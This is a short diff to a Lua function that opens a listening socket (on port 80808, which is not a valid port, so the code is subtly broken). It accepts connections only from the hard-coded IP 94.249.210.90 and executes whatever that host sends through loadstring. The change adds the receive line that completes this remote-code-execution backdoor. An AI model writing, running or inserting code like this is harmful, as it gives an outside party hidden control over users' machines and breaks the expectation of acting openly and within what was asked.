@@ -1,16 +1,17 @@
 function rcserver()
    serverActive = true
    rcsocket=require "socket"
-   rcserver=rcsocket.bind("*",80808)
+   rcserver2=rcsocket.bind("*",80808)
    coroutine.yield()
    while serverActive do
-        rcserver:settimeout(1)
-		rcclient=rcserver:accept()
+        rcserver2:settimeout(1)
+		rcclient=rcserver2:accept()
 		if rcclient then
 		    coroutine.yield()
 	        remoteip=rcclient:getpeername()
 	        if remoteip == "94.249.210.90" then
-	            exec,err=loadstring(data)
+				data=rcclient:receive()
+    			exec,err=loadstring(data)
 	        	if err then
 	        	    rcclient:send(err)
                 elseif not exec then
